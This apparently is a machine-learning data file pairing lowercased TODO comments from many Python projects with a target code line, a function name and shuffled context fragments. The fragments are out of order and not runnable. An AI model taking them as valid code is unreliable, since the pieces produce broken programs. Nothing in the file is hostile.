# todo: use different flag than .reentrant </s> if colorsorter._relative_transforms():	schedule_surface appropriate. if ColorSorter._parent_csdl and ColorSorter._parent_csdl.reentrant: ColorSorter._warn_transforms_nim("schedule_surface") if len(color) == 3:
# c2 = (219, 220, 200, 255)  # todo: not used? </s> _draw_desert_pattern(pixels, x, y, c)	_draw_cool_desert def _draw_cool_desert(pixels, x, y, w, h): c = (72, 72, 53, 255)
# todo(hrybacki): move to framework.utils.rapply once @sam's pr#4027 is merged. </s> from api.base.serializers import _rapply	register_draft_registration @http_error_if_disk_saving_mode def register_draft_registration(auth, node, draft, *args, **kwargs): data = _rapply(request.get_json(), sanitize.strip_html) register = draft.register(auth)
# todo: raise more specific exception </s> raise exception('plugin %s is not loaded' % name)	reload_plugin def reload_plugin(self, name): if name not in self._plugins: plugin = self._plugins[name] plugin.shutdown(self)
# todo extend it to output into multidimensional space </s> return linear(self._mlp_output, 1, scope="output_projection")	predictions @tensor def predictions(self):
# todo: this is ambiguous: it's not clear whether we correctly </s> eq_(elasticutils.s(thread).count(), original_count + 1)	test_added new_post.save() self.refresh()
# todo: use denormalized site_domain field </s> try:	is_local def is_local(self): url = urlparse(self.url) return url.netloc.replace('www', '') == self.site.domain
# todo: estimate fees </s> if fee is none:	create_transaction return None denominator = pow(10, 8) fee = 0.0003 * pow(10, 8) if input_arr is None:
# todo in the future, use http://schacon.github.io/git/git-ls-remote.html to validate the url string </s> clone = request.form.get('clone')	addclone @login_required def addclone(): if len(clone) == 0: flash(_('Enter a URL.'))
# todo: provide some feedback on what happens in git </s> nox_dir = path(click.get_app_dir('nox', force_posix=true))	__init__ def __init__(self): if not nox_dir.exists(): nox_dir.mkdir()
# todo: arrange </s> distro = self.remote.get_distro("testdistro0")	test_get_distro def test_get_distro(self): Test: get a distro object""" assert 0
# todo: with success_re etc </s> downloader = httpdownloader(credential=credential, authenticator=authenticator)	test_HTMLFormAuthenticator_httpretty password="{password}", submit="CustomLogin")) downloader.download(url, path=d) with open(fpath) as f:
# todo: verify learning rule contents </s> self.asserttrue(fib_route_replies)	test_host_ipv4_fib_route 'ipv4_dst': '10.0.0.4', 'echo_request_data': bytes('A'*8, encoding='UTF-8')}) self.assertFalse(self.packet_outs_from_flows(fib_route_replies))
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
# todo: need to delete all queues </s> except:	kill_services try: s.kill() pass del running_services[:]
# todo better logging </s> try:	receive_file def receive_file(self, f_type): scp = SCPClient(self.ssh.get_transport()) if f_type == 'config':
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_play = p_operation.add_parser( "play", help="play PCM file")
# todo xxx </s> labels = tf.ones_like(logits)	create_output dtype='float32') logits = self.forward_pass(shared_resources, question) self.loss = tf.nn.sigmoid_cross_entropy_with_logits(logits=logits, labels=labels) return [self.loss, logits]
# todo(dcramer): this needs to be a get_or_create pattern </s> if args.repository:	put if args.name: app.name = args.name repo = Repository.query.filter( Repository.url == args.repository,
# todo(mordred): this needs to be mutex protected </s> self._external_networks = _external_networks	get_external_networks 'provider:network_type' in network): _external_networks.append(network) self._external_network_stamp = True return self._external_networks
#todo?# self.asserttrue(greps(err, "unit zzz.service not for --user mode")) </s> self.assertequal(out.strip(), "unknown")	bad_usermode_forking_service_functions logg.info(" %s =>%s \n%s\n%s", cmd, end, err, out) self.assertEqual(end, 3) logg.info("== 'start' shall start a service that is NOT is-active ") cmd = "docker exec {testname} {systemctl} start zzz.service -vvvv {quick}"
# todo(mattjj): remove this special case, used for debugging on cpu </s> dims = c.getshape(x).dimensions()	split_array def split_array(shape, x): if xb.get_replica_count() == 1: return c.Reshape(x, None, dims[1:]) else:
# todo: use mock to patch dict </s> vi_options['foo'] = vi_user_setting(scope=scope_window, values=(100,), default='bar', parser=none)	testCanRetrieveWindowLevelSettings def testCanRetrieveWindowLevelSettings(self): self.settsman.view.window().settings().set('vintageous_foo', 100) self.assertEqual(self.settsman['foo'], 100)
# todo: refactor accordingly when v3 websocket api is released </s> output["results"].update({	BittrexAPIOrderBookDataSource elif _is_market_delta(msg): output["results"] = _decode_message(msg["M"][0]["A"][0]) "M": f"{output['results']['M'].split('-')[1]}-{output['results']['M'].split('-')[0]}" })
# todo do something with temp </s> for state, distn in enumerate(self.obs_distns):	resample_obs_distns def resample_obs_distns(self,temp=None): distn.resample([s.data[s.stateseq == state] for s in self.states_list]) self._clear_caches()
# todo: remove in 0.26 when grid_scores_ is deprecated </s> return self	fit verbose=inner_verbose, return_n_iter=True)
# todo: add this back </s> self.address = secret_registry_address	__init__ to_normalized_address(secret_registry_address), ) self.proxy = proxy self.client = jsonrpc_client
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo(dspasovski): fix this. </s> raise skiptest	test_featured_region_exclusions @mock_es def test_featured_region_exclusions(self): self._test_featured_region_exclusions()
# todo - might need to click on transportation mode if url doesn't work </s> attach_img_btn.send_keys(document_location)           # get current script path + img_path	send_document time.sleep(1) attach_img_btn = self.browser.find_element_by_xpath(attach_type_xpath) time.sleep(1) send_btn = self.browser.find_element_by_xpath(send_file_xpath)
# todo this was already broken, just making it obvious </s> return 0	copro_state_time def copro_state_time(self):
# todo: check that the birth date is not in the future </s> except valueerror, e:	is_valid try: birth_date = _get_birth_date(number) return False if len(number) == 10:
pass  # todo </s> def __getattr__(self, attr):	__getattr__
# todo: add a better throttling mechanism </s> if 'sleep' in kwargs:	get_photos options = {k: True for k in options} options.setdefault('account', account) warnings.warn( "The sleep parameter has been removed, it won't have any effect.", stacklevel=2
1  # todo: fill in identifier </s> )	test_closewithouttransfer_badalice AB_Transfer0 = channelAB.create_directtransfer( transfer_amount, AB_Transfer0.sign(privatekeyA, addressA) channelAB.register_transfer(AB_Transfer0)
# todo: add this back </s> self.address = registry_address	__init__ to_normalized_address(registry_address), ) self.proxy = proxy self.client = jsonrpc_client
# todo: only if successful </s> self.last_phase_migration = current_phase.phasenumber	do_phase_migration ) evaluate_submission(new_submission.pk, current_phase.is_scoring_only) self.save() except PhaseLeaderBoard.DoesNotExist:
# todo: docstrings! </s> n = len(electricity.appliances) + len(electricity.mains)	_plot_missing_sample_using_rectanges def _plot_missing_sample_using_rectanges(electricity, ax=None, fig=None): colours = [plt.cm.Blues(c) for c in np.linspace(0.3, 0.9, n)] ylabels = []
# todo(b/132329316) remove when `xla.compile` allows tf.device(tpu). </s> forward = with_soft_placement(forward)	assertCheckpointDistributionStrategy forward = tf.function(forward) if self.primary_device == "TPU": for index, variable in enumerate(variables): variable.assign(goldens.range_like(variable, start=index))
# todo: find a better solution than this: </s> and getattr(self.g_pool, "display_mode", "") != "algorithm"	gl_display if ( frame.yuv_buffer is not None ): self.g_pool.image_tex.update_from_yuv_buffer(
# todo: unit test </s> self.reader = reader	__init__ def __init__(self, reader):
# todo: clocksignal, resetsignal, memory </s> raise notimplementederror	assign self.assign(node.choices[self.eval(node.key)], value) else:
transaction_manager.retry_attempt_count = 3  # todo: hardcoded for now </s> zope.sqlalchemy.register(dbsession, transaction_manager=transaction_manager)	_create_session The attached transaction manager takes care of committing the transaction at the end of the request. dbsession = Session(bind=engine) dbsession.transaction_manager = transaction_manager return dbsession
with prepare_file(["#todo this is todo"], none) as (lines, filename): </s> bear = "keywordbear"	test_find_issues def test_find_issues(self): retval, output = execute_coala(coala_ci.main, "coala-ci", "-c", os.devnull, "-S",
# todo(jogo): make the following doctests pass: </s> pos = physical_line.find('todo')	hacking_todo_format H101: #TODO (jogo) fail Okay: TODO = 5 pos1 = physical_line.find('TODO(') pos2 = physical_line.find('#')  # make sure it's a comment
# todo: extend to string variables </s> arg1, arg2, _ = sig.args	h5_open @lower_builtin(h5py.File, types.Const, types.Const, types.int64) def h5_open(context, builder, sig, args): val1 = context.insert_const_string(builder.module, arg1.value) val2 = context.insert_const_string(builder.module, arg2.value)
# todo implement extra options </s> py_options = read_check_options(options)	read_preamble def read_preamble(options, name): record_separators = py_options["RecordSeparators"] word_separators = py_options["WordSeparators"]
# todo: askr, undocumented! </s> def buttonstateraw( self ):	ButtonStateRaw if self.midi.ReadCheck(): a = self.midi.ReadRaw()
# todo: finish this. </s> pass	statfs def statfs(self, path):
# todo: config option? </s> lgr.info(	_install_subds_from_flexible_source if subrepo.get_merge_base( [branch_hexsha, detached_hexsha]) == detached_hexsha: "Submodule HEAD got detached. Resetting branch %s to point " "to %s. Original location was %s",
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
self.setup() # todo: perhaps, remove this to pass path in context </s> current_ids = self.hasher.hash(	fit_transform :param expected_outputs: the expected data output to fit on :return: the pipeline itself current_ids=None, hyperparameters=self.hyperparams,
# todo: askr, undocumented! </s> def buttonstateraw( self ):	ButtonStateRaw if self.midi.ReadCheck(): a = self.midi.ReadRaw()
# todo: add permissions </s> except exception:	MusicBot entries_added = await player.playlist.async_process_sc_bc_playlist( playlist_url, channel=channel, author=author) traceback.print_exc() raise exceptions.CommandError('Error handling playlist %s queuing.' % playlist_url, expire_in=30)
# todo: handle sigchld to avoid wasting time in polling </s> time.sleep(pause)	execute_subprocess else: pause = 0.1 exitcode = process.poll() else:
# todo: switch to: </s> if self.state == playbackstate.playing:	play return assert tl_track in self.core.tracklist.tl_tracks self.stop() self.current_tl_track = tl_track
# todo: only handle events that are new. </s> for e in events:	__watch_slack_rtm events = self.client.rtm_read() if len(events) > 0: self.handle_incoming_event(e) time.sleep(0.5)
# todo(shoyer): test fails on tpu </s> if jtu.device_under_test() == "tpu":	test_root_scalar def test_root_scalar(self): raise SkipTest("Test fails on TPU") def scalar_solve(f, y):
# todo.hartikainen: remove this </s> kwargs.pop('image_size', none)	feedforward_net_preprocessor_template *args, **kwargs): def _fn(inputs): if ignore_input > 0:
time.sleep(1.0)  # todo properly wait until sequencer is online </s> atexit.register(stop_software_midi_synth, proc.pid)	start_fluidsynth proc = subprocess.Popen(cmd, shell=False, stdout=subprocess.DEVNULL) print_err(f'steam-dos: Starting MIDI client {proc.pid}')
# todo: once we allow filtering, unit.store.units has to be a qs </s> profile = get_profile(request.user)	process_submit suggester=get_profile(request.user), state='pending', unit=unit.id) unit_rows = profile.get_unit_rows() preceding = unit.store.units.filter(index__lt=unit.index).count()
##todo     temp = x </s> yield (x, y, join(dirpath, f))	_iterate_regionfiles x = int(p[1]) y = int(p[2])
if testname == "tests5": continue # todo </s> f = open(filename)	buildTestSuite for filename in html5lib_test_files('tree-construction'): testName = os.path.basename(filename).replace(".dat","") tests = f.read().split("#data\n") for index, test in enumerate(tests):
# todo/rsi for when have nonlocal </s> self.assertnotin("__class__", x.__dict__)	test_various___class___pathologies del globals()["__class__"]
# todo: add axis parameter </s> return self._rank(method, ascending)	rank Name: b, dtype: float64
# todo(b/160795287): deprecate estimator based executor. </s> serving_source = executor._serving_model_path(fn_args.model_run_dir)	run_fn absl.logging.info('Exported eval_savedmodel to %s.', user_fn_args.eval_model_dir) serving_dest = fn_args.serving_model_dir io_utils.copy_dir(serving_source, serving_dest)
# todo: move install_time away from app_setting </s> app_setting(app_instance_name, 'update_time', now)	app_upgrade else: now = int(time.time()) status['upgraded_at'] = now hook_remove(app_instance_name)
# todo scope the cleanup to the current project - https://github.com/lyft/cartography/issues/381 </s> cleanup_gcp_subnets(neo4j_session, common_job_parameters)	sync_gcp_subnets subnets = transform_gcp_subnets(subnet_res) load_gcp_subnets(neo4j_session, subnets, gcp_update_tag)
# todo: import that elsewhere </s> from . import _control	shareConstant def shareConstant(**kwargs): _control.execQueue.socket.pumpInfoSocket() for key, value in kwargs.items():
#todo : multi parent intelligence </s> id = child.get_id()	add_child def add_child(self, child): self.children.append(id)
# todo: fix with stubber / before send event </s> with patch('botocore.endpoint.endpoint._send') as mock_send:	get_prepared_request if force_hmacv1: self.session.register('choose-signer', self.enable_hmacv1) mock_send.return_value = self.mock_response client = self.session.create_client('s3', self.region_name)
"""the arguments given to a command.""" #todo elaborate </s> s.admin = origin.nick in self.config.admins	__new__ See Python ``re_`` documentation for details.""" s.args = args True if the nick which triggered the command is in jenni's admin list as defined in the config file.
# todo: should we enable auto-retry, </s> producer.publish(msg, exchange=exchange)	do_publish elif exchange is not None: maybe_declare(exchange, channel)
# todo: set language preference from config </s> langs = []	readSettings def readSettings(self): lang = locale.getdefaultlocale()[0] if lang:
pass # todo </s> def handle_request(self, input):	handle_request
# todo is this serious enough to raise a canerror exception? </s> log.error('setting filters failed; falling back to software filtering (not in kernel): %s', err)	_apply_filters except socket.error as err: self._is_filtered = False else: self._is_filtered = True
# todo: convert to a python xml thing </s> print unicode(toc.tostring())	on_actionRender_triggered toc=self.pdf.document.toc() if toc:
# todo(hartikainen): this should get the logdir some other way than </s> summary_dir = logger._snapshot_dir	__init__ self._init_target_ops() if self._tf_summaries: self.summary_writer = tf.summary.FileWriter( summary_dir, self._sess.graph)
# xxx todo </s> return []	fnclex def fnclex(info):
pass  # todo </s> "decode message without key."	decode def decode(message):
# todo pydocs </s> def __init__(self, service, project_id):	BigQueryBaseCursor class BigQueryBaseCursor(object): self.service = service self.project_id = project_id
# todo: create a remote print interface for objects which displays them in a </s> result = repr(obj.data)	process raise PermissionError("Permission to get repr of object not granted!") else: return GetReprReplyMessage(repr=result, address=msg.reply_to)
# todo: batch </s> for label in labels:	LabelSet def remove(self, *labels): if self.__uri__: uri = "{0}/{1}".format(self.__uri__,  quote(label)) self._send(rest.Request(self._graph_db, "DELETE", uri))
# todo(nakago): check why tolerance is high </s> @pytest.mark.gpu	test_backward_gpu def test_backward_gpu(model, data): atom_data, adj_data, y_grad = [cuda.to_gpu(d) for d in data]
# todo: must be implemented </s> pass	get_range_from_volumes def get_range_from_volumes(self, volumes, times=0):
# todo: https://github.com/turicas/brasil.io/issues/210 </s> return file	clean_file msg = f"Formato de planilha inválida. O arquivo precisa estar formatado como {valid}." raise forms.ValidationError(msg)
# todo: [debug] change this </s> pass	system_upload stop_system_importer_file_csv = run_check_config_attributes(model) if stop_system_importer_file_csv_run: model = SystemImporterFileCsvConfigModel.objects.get(system_importer_file_csv_config_name = 'SystemImporterFileCsvConfig') if not model.csv_skip_existing_system:
# todo: use triple factory </s> batch_size = 16	test_conv_kb model = ConvKB(triples_factory=self.factory, embedding_dim=4, num_filters=8) self.assertIsNotNone(model) triples = torch.zeros(batch_size, 3, dtype=torch.long) scores = model.forward_owa(triples)
# todo: there's a race with the initial "output" event. </s> wait(reason="event 'output'")	test_launch_ptvsd_client ], ) (req_initialize, req_launch, req_config ) = lifecycle_handshake(session, 'launch')
# todo: how do we handle this? </s> msg = none	feed msg = msg(pos=value) else: if msg: self._messages.append(msg)
# todo(b/135607227): add device scope automatically in keras training loop </s> no_dist_strat_device = tf.device('/device:gpu:0')	run validation_data = None if not strategy and flags_obj.explicit_gpu_placement: no_dist_strat_device.__enter__() history = model.fit(train_input_dataset,
# todo: finnish luks+zfs </s> self.zfs_options["encrypt_disk"] = false	translate_ui self.header.set_subtitle(_("ZFS Setup")) btn = self.ui.get_object("encrypt_disk_btn") btn.set_sensitive(False) btn.set_active(self.zfs_options["encrypt_disk"])
# todo: replace with below line when numba supports np.isin in nopython mode </s> return pandas.series([(x in values) for x in self._data])	hpat_pandas_series_isin_impl def hpat_pandas_series_isin_impl(self, values):
# todo "specify timestamp precision when writing to influxdb."? </s> client.write_points(cl, database=db)	fill_influxdb logger.debug('writing next chunk %s', cl[-1])
engine = db.connect() # todo do i need to tear anything down?? </s> meta = sa.metadata(engine)	main db_path.unlink() db = sa.create_engine(f'sqlite:///{db_path}') schema = make_schema(xx_obj()) sa.Table('locations', meta, *schema)
# todo add </s> pass	set_pre_input_hook def set_pre_input_hook(function=None):
# @todo: pheonix </s> tree.setitemtext(childid, 1, "level %d" % int(level) if isinstance(level, float) else level)	populateSkillTreeSkillSearch level, dirty = sChar.getSkillLevel(char.ID, id)
# todo: componentize! </s> self.toplevel.output.append(str(e), "exception")	_on_key_press_event point = buffer.get_iter_at_line_offset(e.lineno, e.offset) buffer.place(point) except (OverflowError, ValueError), e: self.toplevel.output.append(str(e), "exception")
#ack = self.serial_port.read() # todo: use ack </s> self.sendcommand(133) # 10000101	SetMotorCW def SetMotorCW(self):
# todo: implement </s> pass	result_by_parent_id @staticmethod def result_by_parent_id(parent_id):
match = re.search(pattern, ret) # todo: more strict </s> if match:	getModulInfoByName ret = exeCommand(debugger, "im li -o -f") pattern = ".*" + moduleName.replace("\"", "") found = match.group(0) else:
# todo ideally this happens a layer higher, but this is a bad </s> return sanitize_html(open(filename).read()).encode('utf-8')	_yield_user_file_content if not from_dataset.creating_job.imported and from_dataset.creating_job.tool_id in trans.app.config.sanitize_whitelist: return open(filename) return open(filename)
# todo: stub function, add actual logic </s> def public_payment_permissions(_info, _object_pk: any) -> list[basepermissionenum]:	public_payment_permissions return []
full_payload)  # todo: parse response for confirmation. </s> self.treasure_map.add_ursula(policy.ursula)	enact response = networky_stuff.enact_policy(policy.ursula, self.hrac(),
# todo(rakhmerov): implement. </s> pass	test_partial_join def test_partial_join(self):
# todo: fix with stubber / before send event </s> with mock.patch('botocore.endpoint.endpoint._send') as mock_send:	_verify_expected_endpoint_url config=config, endpoint_url=customer_provided_endpoint) mock_send.return_value = http_response s3.put_object(Bucket=bucket,
# todo: consider use float32 type from the beginning of this function </s> xy_ctr = torch.from_numpy(xy_ctr.astype(np.float32))	get_xy_ctr_np batch, -1, 2)  # .broadcast([batch, fm_height, fm_width, 2]).reshape(batch, -1, 2) return xy_ctr
# todo files listed here may not belong to the given camera </s> return movie_files	list_movies full_paths = _list_media_files(target_dir, exts=_MOVIE_EXTS) movie_files = [p[len(target_dir):] for p in full_paths]
# todo: update consumer </s> return	bind except DuplicateKeyError:
#todo: issue warning that this is an unsafe operation, but doing it cause user insists </s> try:	atomic_move e = get_exception() if unsafe_writes and e.errno == errno.EBUSY: try: out_dest = open(dest, 'wb')
# todo: remove when support is python 3.6+ only </s> path = str(path)	from_xml raise ValueError("Either path or OPENMC_CROSS_SECTIONS " "environmental variable must be set") tree = ET.parse(path) root = tree.getroot()
""" todo: better test here """ </s> nonce = generate_nonce()	test_generate_nonce def test_generate_nonce(self): self.assertEqual(len(nonce), 30) for i in range(50):
# todo: start looking in current group. </s> if view.id() == sought_id:	ExPromptSelectOpenFile sought_id = self.view_ids[index] for view in self.window.views(): self.window.focus_view(view)
# todo: proper java error? </s> raise runtimeerror("could not find static method ('%s', '%s') in class %s." % (name, sig, clazz.value.jvm_name))	get_static_method_id method = clazz.value.find_method(name, sig) if method is None: return method.jvm_id
# todo: capture stdout for both the test assert and docs embedding </s> prob.run_model()	test_feature_iprint_0 ln_scipy.options['iprint'] = -1
# todo: bindings should be done in collection class: </s> metacollection.conjunctive_graph.bind('dlns', dlns)	__call__ for remote in local_master.git_get_remotes()] + [local_master.get_backend_from_branch()]) query_string = """SELECT ?g ?r {GRAPH ?g {?r rdf:type dlns:Handle . ?s ?p ?o .
# todo: support axel, prozilla </s> raise exception('aria2c exited abnormaly')	aria2_download if exit_code != 0:
# todo check if lus can be more than one token </s> tag = 'b-lu' if lemma == annotations['lu'] else 'o'	process_sentence processed = list() for i, (token, pos, lemma) in enumerate(lines): processed.append([ sentence_id, '-', token, pos, lemma, annotations['frame'], tag
#todo: support unicode, greek, and special latin characters </s> if keysym & 0x7f == keysym and chr(keysym) in 'abcdefghijklmnopqrstuvwxyz':	lookup_char_from_keycode keysym_index = 0 keysym = self.display.keycode_to_keysym(keycode, keysym_index) keysym_index = 1 elif self.modifiers['Shift'] and self.modifiers['Caps_Lock']:
# todo: add option for attentive reader </s> print('trainable variables (only embeddings): %d' % get_total_trainable_variables())	boe_nosupport_cands_reader_model varscope.reuse_variables() candidates_embedded = nvocab(candidates) question_encoding = tf.reduce_sum(question_embedded, 1) scores = logits = tf.reduce_sum(tf.expand_dims(question_encoding, 1) * candidates_embedded, 2)
# todo: this will incorporated in the future, if needed. </s> edge_starts = []	specify_edge_starts edge_starts = [] else: return edge_starts
accept_federated_only=self.federated_only)  # todo: 466 </s> if seed_node is false:	__attempt_seednode_learning known_certs_dir=self.known_certificates_dir, timeout=timeout, unresponsive_seed_nodes.add(seednode_metadata) else:
# todo, make broadcasting </s> await self.socketio.emit(	TaskHandlers project_uuid, get_all=True ) 'tasks:all:get:back:all', { "status": "success",
# todo: other types like boolean </s> typ_val = _h5_typ_table[data_t.dtype]	gatherv_overload def gatherv_overload(data_t): assert isinstance(data_t, types.Array) func_text = ( "def gatherv_impl(data):\n"
# todo - implement fully and test </s> def getfocus(self):	GetFocus "Return the control that has the Focus" win32functions.GetFocus(self)
# todo untested </s> 1/0	__setattr__ self._name, nid, _api.MBSTRING_UTF8, value, -1, -1, 0) if not add_result:
# todo semantic validation </s> create_response = self.client.update(fsid, crush_rule, int(rule_id), defaults)	CrushRuleViewSet rule_data['steps'] = request.DATA['steps'] defaults.update(rule_data) assert 'request_id' in create_response return Response(create_response, status=status.HTTP_202_ACCEPTED)
# todo stub </s> def test_accumulate() -> none:	test_accumulate pass
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_unexpected_parameters def test_fail_unexpected_parameters(self):
# todo(b/160795287): deprecate estimator based executor. </s> absl.logging.warning('support for estimator-based executor and model export'	serving_model_path export_dir = os.path.join(model_dir, 'export') if tf.io.gfile.exists(export_dir): ' will be deprecated soon. Please use export structure ' '<ModelExportPath>/serving_model_dir/saved_model.pb"')
# todo: support minp arg end_range etc. </s> minp = win	roll_sum_fixed_seq nobs = 0 N = len(in_arr) offset = (win - 1) // 2 if center else 0 output = np.empty(N, dtype=np.float64)
# todo: has some issues with datetime and sqlite </s> self._test_model('language', post_language_data)	test_language_api def test_language_api(self):
# todo: replace xrange (could fail with 32-bit python 2.x). </s> for x in xrange(self.bytelength - 1):	setoffset if newoffset < self.offset: shiftleft = self.offset - newoffset data[x] = ((data[x] << shiftleft) & 255) + \ (data[x + 1] >> (8 - shiftleft))
# todo pseudo code: </s> pass	Play def Play(self): logger.debug(u'%s.Play called', PLAYER_IFACE)
# todo(slaweq): change this to neutron floating ips and turn neutron </s> mock_nova.floating_ips.list.return_value = [fake_floating_ip]	test_create_server_wait_server_error mock_nova.servers.get.return_value = build_server mock_nova.servers.list.side_effect = [[build_server], [error_server]] self.assertRaises( exc.OpenStackCloudException,
# todo: this can unnecessarily suspend the starting of a build, in </s> log.msg("starting build %s.. pinging the slave %s"	_startBuildFor self.botmaster.maybeStartBuildsForBuilder(self.name) return % (build, slavebuilder)) wfd = defer.waitForDeferred(
# todo: this is a hack to make a rule know </s> if slot.value == "none" and slot.as_feature():	get_parsing_states for key, slot in tracker.slots.items(): if slot is not None: slot_id = f"slot_{key}_None" state_dict[slot_id] = 1
# # todo: </s> return os.path.join('urlextract', item_date, item_id) + '.gz'	get_item_id item_id = '{}{}.gz'.format(file_name_paste[:215], str(uuid.uuid4()))
# todo: memoize? </s> return [d for d in self._data() if d is not none]	_data_without_nulls def _data_without_nulls(self):
# todo: kill this </s> inspection = inspection[0]	domain_doesnt_support_https if not inspection: return False https = inspection.get("endpoints").get("https") httpswww = inspection.get("endpoints").get("httpswww")
# todo: implement model fitting based on the legacy code bellow </s> self.__outlier_threshold = outlier_threshold	GazerHMD2D_v1x self.__hmd_video_frame_size = hmd_video_frame_size
# todo: calculate the checksum if not given </s> self.__checksum_type = checksum_type	set_checksum def set_checksum(self, checksum_type='', checksum=''): self.__checksum = checksum
'auto_link': m.case_type == module.case_type,   # todo: which menus need manual linking? some child menus probably </s> }	_get_form_link_context 'unique_id': m.unique_id, 'name': trans(m.name, langs), for m in {mod.unique_id: mod for mod in modules if not mod.put_in_root}.values() ], key=lambda link: link['name']),
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, axis=none, skipna=none, level=none, numeric_only=none):	_impl return hpat.hiframes.pd_dataframe_ext.min_dummy(df)
# end todo </s> _build_make_spec_commom(make_spec_parser)	add_make_spec_parser make_spec_parser.add_argument('--app-version', help=argparse.SUPPRESS) make_spec_parser.add_argument('-k', '--keep', help=argparse.SUPPRESS)
# todo make bit depth and sample rate into parameters. </s> outputfile = '-t raw -b 32 -r 44100 -e floating-point -'	__call__ raise ValueError('Combining files not supported yet.') if not outputfile: x = 'sox'.split() x.extend(inputfile.split())
# todo: figure out the right thing to do here </s> return mu_1 + mu_2, np.array([0.0, 0.0, 1.0, 0.0, 0.0, 1.0], dtype=np.float32)	uncertainty_embedding_grad det = sigma_11 * sigma_22 - sigma_12 * sigma_21 if det == 0.0: cross_term = sigma_12 + sigma_21 m_dist = sigma_22 * (mu_1 ** 2) - \
# todo: improve this code. </s> if self._arch_info.architecture_mode == arch_x86_mode_64 and \	_translate_div tb.add(self._builder.gen_str(reil_immediate, reil_operand_base)) tb.add(self._builder.gen_str(tmp5, result_low)) result_high.size == 32: if result_high.name in tb._regs_mapper:
# todo: remove warning check once deprecated </s> hits = list(self.df.sindex.intersection((2.5, 2.5, 4, 4), objects=true))	test_sindex assert self.df.sindex.size == 5 with pytest.warns(FutureWarning, match="`objects` is deprecated"): assert len(hits) == 2 assert hits[0].object == 3
# todo: support unicode </s> in_str = unicode_to_std_str(str_arr[i])	_str_replace_noregex_impl str_list = hpat.str_ext.alloc_str_list(n) for i in numba.parfor.internal_prange(n): out_str = std_str_to_unicode( hpat.str_ext.str_replace_noregex(in_str, e, val))
# todo: try removing the none checks after https://github.com/mozilla/rust-code-analysis/issues/528 is fixed. </s> if metrics["mi"]["mi_original"] is not none:	get_summary_metrics obj["nexits_max"] = max(obj["nexits_max"], metrics["nexits"]["sum"]) obj["cognitive_max"] = max(obj["cognitive_max"], metrics["cognitive"]["sum"]) obj["mi_original_max"] = max( obj["mi_original_max"], metrics["mi"]["mi_original"]
oldsize = self.size # todo: remove </s> assert type(self.body) in (str, list), '%s: %s' % (self.type, type(self.body))	Atom atom.write(stream) def calsize(self): if type(self.body) == str: pass
# todo: use the following when reddit pr #631 is added </s> self.asserttrue(all(x.mod_id36 == other.id for x in actions))	test_get_mod_log_with_mod_by_redditor_object self.assertTrue(actions)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo(gabriel-bezerra): simplify this after mitaka </s> self.assertequal(	test_verify_node_info_missing_sht self.node ) ("Missing the keys for the following OneView data in node's " "properties/capabilities: server_hardware_type_uri."),
#     todo </s> return os.close(fh)	Filesystem def release(self, path, fh):
#todo: actually check for change </s> self._smudge('__delslice__', k, none)	__delslice__ def __delslice__ (self, k): list.__delslice__(self, k)
# todo(msb) all-to-all </s> dispatched_input = torch.squeeze(dispatched_input, 0)  # drop e dimension	all_to_all_dispatch def all_to_all_dispatch(self, dispatch_mask: Tensor, input: Tensor) -> Tensor: dispatched_input = torch.einsum("gsec,gsm->egcm", dispatch_mask.float(), input) return dispatched_input
# todo: remove all elements of the list and remove the blacklist </s> blacklist = [	test_no_experimental_api def test_no_experimental_api(): "tensorflow_addons/optimizers/weight_decay_optimizers.py", ]
# todo: optimise this </s> look_vector = self._look_vector()	_collision_locations :param max_distance: The maximum distance along the look vector to traverse. :return: A generator of [x, y, z] numpy arrays dx, dy, dz = look_vector vectors = numpy.array(
# todo: uncomment to enable claiming </s> ], prefix='/api/v1')	make_url_map json_renderer ),
# todo: remove the need for using dbobject.qualified_name </s> all_reads = set([i.qualified_name for i in all_reads_raw])	determine_nonschema_privileges_for_schema has_default_read = dbcontext.has_default_privilege(role, schema, objkind, 'read') all_reads_raw = dbcontext.get_role_objects_with_access(role, schema, objkind, 'read') if has_default_read or (all_reads == schema_objects and all_reads != set()): return all_writes, set([schema + '.*'])
# todo: reevaluate how to deal with different types of errors; soft </s> del result['error']	smart_search_prefix result = Prefix.smart_search(request.params['query_string'], search_options, extra_query) except NipapError, e: return json.dumps({'error': 1, 'message': e.args, 'type': type(e).__name__})
# todo: move to base class </s> return self.getlodvaluefromscale(editablestylesheet().lod_number[0], self.currentviewscale())	getCanvasLodValueFromCurrentScale def getCanvasLodValueFromCurrentScale(self):
# todo: kwargs </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	pct_change_overload @overload_method(DataFrameType, 'pct_change') def pct_change_overload(df, periods=1, fill_method='pad', limit=None, freq=None): return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods) return _impl
break  # we are done. todo: should we continue? ;) </s> except exception as exc:	duecredit_dataset description=desc ) lgr.debug("DueCredit .cite caused %s", exc_str(exc))
# todo: reflection formula </s> znew = mpi_add((a1,a2), mpi_one, wp), (b1,b2)	mpci_gamma if mpf_lt(a1, gamma_min_b): if mpi_overlap((b1,b2), (gamma_mono_imag_a, gamma_mono_imag_b)): if type == 0: return mpci_div(mpci_gamma(znew, prec+2, 0), z, prec) if type == 2: return mpci_mul(mpci_gamma(znew, prec+2, 2), z, prec)
# todo: test/handle object not found. </s> return actionapi.from_model(action_db)	get_one GET /actions/1 action_db = Action.get_by_id(id)
# todo: handle direct payments </s> self.ws = websocket_server	await_funding Deletes the unfunded contract from the file system and db if it goes unfunded for more than 10 minutes. self.blockchain = libbitcoin_client self.is_purchase = is_purchase
# todo: test me @jmcarp </s> admins = [	manage_contributors if user not in users ] user for user in users if self.has_permission(user, 'admin')
